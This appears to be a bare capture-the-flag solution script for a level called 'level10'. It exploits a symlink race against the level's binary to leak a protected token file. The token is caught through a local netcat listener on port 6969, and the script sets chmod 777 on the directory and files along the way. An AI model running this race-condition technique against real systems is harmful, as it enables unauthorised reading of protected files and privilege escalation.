#!/bin/bash

nc -l -k 6969 > tkn &

chmod 777 .
touch in
chmod 777 in

echo '#!/bin/bash' > myscript.sh
chmod 777 myscript.sh
echo >> myscript.sh
echo "while true" >> myscript.sh
echo "do" >> myscript.sh
echo "   ln -sf in mylink" >> myscript.sh
echo "   ln -sf token mylink" >> myscript.sh
echo "done" >> myscript.sh

./myscript.sh &

./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1

cat tkn

./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1
./level10 mylink 127.0.0.1

cat tkn

# su flag10
# getflag
